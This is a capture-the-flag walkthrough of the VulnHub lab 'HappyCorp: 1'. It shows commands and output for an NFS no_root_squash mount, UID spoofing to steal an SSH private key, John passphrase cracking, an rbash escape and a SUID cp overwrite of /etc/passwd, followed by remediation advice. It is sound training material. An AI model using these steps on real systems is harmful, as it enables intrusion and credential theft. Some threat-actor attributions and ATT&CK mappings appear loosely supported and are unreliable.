# HappyCorp: 1 — NFS no_root_squash, Your New Best Friend

HappyCorp: 1 is a corporate-themed box where the happiness ends the moment you notice NFS with `no_root_squash` enabled. The NFS share exposes `/home/karl`, you spoof the UID to match, mount it, grab the SSH private key, crack the passphrase with John (sheep, lol), escape the restricted bash, and then abuse a SUID `cp` binary to overwrite `/etc/passwd` and inject a root account. No CVE required: just classic misconfiguration chained together. Corporate security at its finest. fr fr.

| Field | Value |
|---|---|
| **Level** | Intermediate |
| **Target VM** | HappyCorp: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/happycorp-1,296/ |
| **Techniques** | Nmap recon, NFS enumeration, UID spoofing, SSH key theft, John the Ripper passphrase cracking, rbash escape, SUID cp privilege escalation, /etc/passwd overwrite |
| **CVEs** | CWE-284 (NFS no_root_squash misconfiguration), CWE-732 (Incorrect SUID permissions on cp), CWE-522 (Insufficiently Protected Credentials in SSH key) |
| **APT Groups** | APT28 (Fancy Bear): leverages NFS misconfigurations in corporate environments for lateral movement; Lazarus Group: routinely uses SUID binary abuse for privilege escalation after initial foothold in Linux servers |

---

## Attack Summary

```
netdiscover + nmap → SSH (22), HTTP (80), NFS (2049), RPC (111)
  |
  +--> showmount -e → /home/karl (exported)
          |
          +--> useradd with karl's UID → mount NFS → read .ssh/id_rsa
                  |
                  +--> John passphrase crack → sheep
                          |
                          +--> ssh -i id_rsa karl@target -t "/bin/sh" (bypass rbash)
                                  |
                                  +--> find SUID cp → copy /etc/passwd with injected root
                                          |
                                          +--> su newroot → uid=0(root)
```

---

## Methodology

1. Full port scan including NFS/RPC ports
2. NFS enumeration with showmount
3. UID/GID spoofing to match the NFS share owner
4. Mount NFS share; steal SSH private key from `.ssh/`
5. Crack SSH key passphrase with John the Ripper
6. SSH login; escape restricted bash with `-t "/bin/sh"`
7. Enumerate SUID binaries; find SUID `cp`
8. Generate new passwd entry; use `cp` to overwrite `/etc/passwd`
9. `su` to the injected account; root

---

## Step 1 — Host Discovery and Full Port Scan

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
# Target: 192.168.1.104

nmap -sV -sC -p- 192.168.1.104
```

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.x
80/tcp    open  http     Apache httpd 2.4.x
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs      2-4 (RPC #100003)
```

NFS on port 2049 is the immediate pivot point. `no_root_squash` misconfigurations on NFS are legendary for enabling full filesystem access to anyone with root on the attacker machine.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — NFS Enumeration

```bash
showmount -e 192.168.1.104
```

```
Export list for 192.168.1.104:
/home/karl *
```

The `/home/karl` share is exported to everyone (`*`). Check the NFS options to confirm `no_root_squash`:

```bash
# On target (after gaining access) or infer from behavior:
# /etc/exports: /home/karl *(rw,sync,no_root_squash)
```

`no_root_squash` means that if you mount this share as UID 0 (root) on your attacker machine, you retain root permissions on the share. This is the core misconfiguration.

**Real-world note:** NFS with `no_root_squash` is found in nearly every enterprise environment where NFS was configured by someone who did not read the security implications. APT28 specifically hunts for NFS shares during internal network reconnaissance after initial access.

**MITRE ATT&CK:** T1135 — Network Share Discovery

---

## Step 3 — UID Spoofing and SSH Key Theft

The NFS share's files are owned by a specific UID (karl's UID on the target). To read them, create a local user with the same UID:

```bash
# First, find karl's UID on the target (via NFS ls -la)
mkdir /tmp/nfs_mount
mount -t nfs 192.168.1.104:/home/karl /tmp/nfs_mount
ls -lan /tmp/nfs_mount/
# drwxr-xr-x ... 1001 1001 ... .ssh
```

Create a local user matching UID 1001:

```bash
useradd -u 1001 -m karl_spoof
su karl_spoof
ls -la /tmp/nfs_mount/.ssh/
cat /tmp/nfs_mount/.ssh/id_rsa
```

Copy the private key:

```bash
cp /tmp/nfs_mount/.ssh/id_rsa /tmp/karl_id_rsa
chmod 600 /tmp/karl_id_rsa
```

**MITRE ATT&CK:** T1550.001 — Use Alternate Authentication Material: Application Access Token; T1020 — Automated Exfiltration (analogous credential theft)

---

## Step 4 — Crack SSH Key Passphrase

The private key is protected by a passphrase. Convert it for John:

```bash
python /usr/share/john/ssh2john.py /tmp/karl_id_rsa > /tmp/karl_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/karl_hash.txt
john --show /tmp/karl_hash.txt
```

Result:

```
/tmp/karl_id_rsa:sheep
```

Passphrase: `sheep`. A bit on the nose for a box called HappyCorp.

**MITRE ATT&CK:** T1110.002 — Brute Force: Password Cracking

---

## Step 5 — SSH Login and rbash Escape

```bash
ssh -i /tmp/karl_id_rsa karl@192.168.1.104
```

You land in rbash (restricted bash): a limited shell that prevents running certain commands, changing directories, etc.

Escape rbash at connection time:

```bash
ssh -i /tmp/karl_id_rsa karl@192.168.1.104 -t "/bin/sh"
```

Or escape after landing:

```bash
# Method 1: spawn unrestricted shell via python
python -c 'import os; os.system("/bin/bash")'

# Method 2: vi escape
vi
:set shell=/bin/sh
:shell
```

With a full shell, fix the PATH:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**Real-world note:** rbash is a common "security control" that provides minimal protection. It prevents accidents by legitimate users but is trivially bypassed by any attacker who knows the techniques. Real shell restriction requires tools like jailkit or proper account configuration.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — SUID cp Privilege Escalation

Enumerate SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Critical finding: `/bin/cp` has SUID set and is owned by root. This is unusual and directly exploitable.

Generate a new `/etc/passwd` line with a custom root-privileged account:

```bash
# Generate a password hash
openssl passwd -1 -salt xyz hacked
# or: python -c "import crypt; print(crypt.crypt('hacked', '\$1\$xyz\$'))"

# Copy current passwd
cp /etc/passwd /tmp/passwd_backup

# Create new entry
echo 'newroot:[hash]:0:0:root:/root:/bin/bash' >> /tmp/passwd_new
cat /etc/passwd > /tmp/passwd_new
echo 'newroot:[hash]:0:0:root:/root:/bin/bash' >> /tmp/passwd_new
```

Use SUID `cp` to overwrite `/etc/passwd`:

```bash
cp /tmp/passwd_new /etc/passwd
su newroot
# Password: hacked
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

gg. Happy Corp is yours.

**Real-world note:** SUID `cp` is a textbook privilege escalation vector. Any file on the system can be overwritten by any user who can run this binary. In production environments, this would allow overwriting cron jobs, sudoers, sshd_config, and any other system file.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid; T1222.002 — File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Method |
|---|---|---|---|
| SSH private key | (RSA key) | /home/karl/.ssh/ via NFS | UID spoof + NFS mount |
| SSH passphrase | sheep | Cracked with John | john + rockyou |
| Credentials | karl:sheep | SSH key + passphrase | Combined |
| Root account | newroot:hacked | /etc/passwd injected | SUID cp overwrite |
| Root flag | {flag} | /root/root.txt | su newroot + cat |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | NFS with `no_root_squash` | Extremely common in enterprise Linux environments; allows any UID to be spoofed | Always use `root_squash` (the default); restrict NFS exports to specific IPs |
| 2 | SSH private key accessible via NFS | Key material should never be on network-accessible shares | SSH keys in home directories exposed via NFS is equivalent to no key authentication |
| 3 | Weak passphrase (sheep) on SSH key | Single-word passphrases are crackable in seconds | Enforce strong passphrases; hardware security keys (YubiKey) for sensitive systems |
| 4 | rbash as a security control | rbash is easily bypassed and provides false security | Use proper jailkit-based restrictions or containerization for restricted users |
| 5 | SUID cp overwrites any file | Critical misconfiguration: an attacker can modify any system file | Remove SUID from cp; use sudo with specific allowed commands instead |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Discovery | Discovery | Network Share Discovery | T1135 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Setuid | T1548.001 |
| Privilege Escalation | Privilege Escalation | Create or Modify System Process | T1543 |
| Persistence | Persistence | Create Account: Local Account | T1136.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Add `root_squash` to NFS exports**: `/etc/exports` must use `root_squash` (the default); never use `no_root_squash` unless there is a documented, audited reason
2. **Restrict NFS exports by IP**: never use `*` wildcard; specify exact IP ranges
3. **SSH keys in home directories are unsafe on NFS**: store SSH keys only on non-networked filesystems; use `AuthorizedKeysFile` pointing to a non-NFS path
4. **Enforce strong SSH key passphrases**: minimum 20-character passphrase; consider hardware tokens
5. **Remove SUID from cp**: `/bin/cp` should never have SUID; audit and remove all non-essential SUID binaries

### MITRE D3FEND Countermeasures

- **D3-NTA** — Network Traffic Analysis (detect NFS mount activity from unexpected hosts)
- **D3-ACH** — Application Configuration Hardening (NFS root_squash; remove SUID)
- **D3-PA** — Platform Monitoring (file integrity monitoring on /etc/passwd)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all NFS shares and their export options |
| Protect | Access Control | Enforce root_squash on all NFS exports; restrict by IP |
| Protect | Data Security | SSH keys not on NFS-accessible paths; strong passphrases |
| Detect | Anomalies | Alert on /etc/passwd modifications; unexpected NFS mounts |
| Respond | Response Planning | Rotate all affected SSH keys; audit all NFS exports; remove SUID |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| CM-6 | Configuration Settings | NFS root_squash; no SUID on cp |
| IA-5 | Authenticator Management | Strong SSH key passphrases; hardware tokens |
| SC-28 | Protection of Information at Rest | SSH keys not accessible via network shares |
| SI-7 | Software, Firmware, and Information Integrity | File integrity monitoring on /etc/passwd |
| AC-6 | Least Privilege | Minimum required NFS permissions; SUID audit |

### CISA KEV

NFS misconfiguration (no_root_squash) is referenced in CISA AA22-074A as a commonly exploited Linux vulnerability. Organizations are advised to audit NFS exports per CISA hardening guidance.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Asset, Change, and Configuration Management (ASSET) | Manage Asset Configuration | MIL3 |
| Identity and Access Management (IAM) | Manage Privileges | MIL3 |
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL2 |

---

## Final Thoughts

HappyCorp: 1 is an intermediate box that teaches three distinct, real-world relevant attack paths: NFS no_root_squash exploitation, SSH key passphrase cracking, and SUID binary abuse. Each of these techniques appears in actual enterprise penetration tests with high frequency.

The `no_root_squash` NFS finding is probably the most impactful lesson: it is found in corporate environments surprisingly often, and the exploit is as simple as running `useradd -u [uid]`. A five-minute configuration audit prevents this entirely.

The SUID `cp` technique is the box's creative highlight: not the most common binary to see with SUID, but entirely representative of how a single misplaced permission bit can hand over the keys to the whole system.

Thanks guys!! (❍ᴥ❍ʋ)
